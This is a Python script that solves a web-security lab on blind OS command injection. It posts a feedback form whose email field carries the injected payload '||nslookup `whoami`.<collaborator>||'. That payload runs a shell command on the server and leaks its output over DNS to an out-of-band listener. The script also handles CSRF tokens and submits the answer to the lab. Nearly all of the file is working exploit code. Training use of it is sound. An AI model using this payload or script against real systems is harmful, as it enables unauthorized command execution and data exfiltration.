"""
Lab: Blind OS command injection with out-of-band data exfiltration

This script exploits a blind OS command injection vulnerability to exfiltrate data using Burp Collaborator.

Steps:
1. Copy a unique Burp Collaborator payload from the Collaborator tab.
2. Send feedback with the email parameter set to: ||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||
   (Replace BURP-COLLABORATOR-SUBDOMAIN with your actual Collaborator payload)
3. Poll Burp Collaborator and observe the DNS interaction. The whoami output will appear as a subdomain.
4. Enter the username shown in the Collaborator interaction to solve the lab.

Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--collab', required=True, help='Burp Collaborator subdomain (e.g., abcdef1234.burpcollaborator.net)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    collab = args.collab
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    # Step 1: Send feedback with OAST data exfiltration payload
    feedback_url = f"{url}/feedback/submit"
    csrf_token = get_csrf(session, f"{url}/feedback")
    data = {
        "name": "attacker",
        "email": f"||nslookup `whoami`.{collab}||",
        "subject": "test",
        "message": "test",
        "csrf": csrf_token
    }
    print(f"{Fore.YELLOW}[*] Sending feedback with OAST data exfiltration payload...{Fore.RESET}")
    r = session.post(feedback_url, data=data)
    print(f"{Fore.GREEN}[+] Feedback submitted. Status code: {r.status_code}{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Check Burp Collaborator for DNS interaction. The whoami output will appear as a subdomain in the interaction. Use it to solve the lab.{Fore.RESET}")

    # Step 2: Prompt user to submit the solution after checking Collaborator
    answer = input(f"{Fore.YELLOW}Enter the username (from Collaborator interaction) to submit as solution, or leave blank to skip: {Fore.RESET}").strip()
    if answer:
        print(f"{Fore.YELLOW}[*] Submitting solution: {answer}{Fore.RESET}")
        submit_url = f"{url}/submitSolution"
        # Get CSRF token from the main page (where the submit form is)
        csrf_token = get_csrf(session, f"{url}/")
        resp = session.post(submit_url, data={"answer": answer, "csrf": csrf_token})
        if "Congratulations, you solved the lab!" in resp.text:
            print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
        else:
            print(f"{Fore.RED}[-] Failed to solve the lab. Check the username and try again.{Fore.RESET}")
    else:
        print(f"{Fore.YELLOW}[-] Solution submission skipped.{Fore.RESET}")

def get_csrf(session, page_url):
    r = session.get(page_url)
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on feedback page{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()
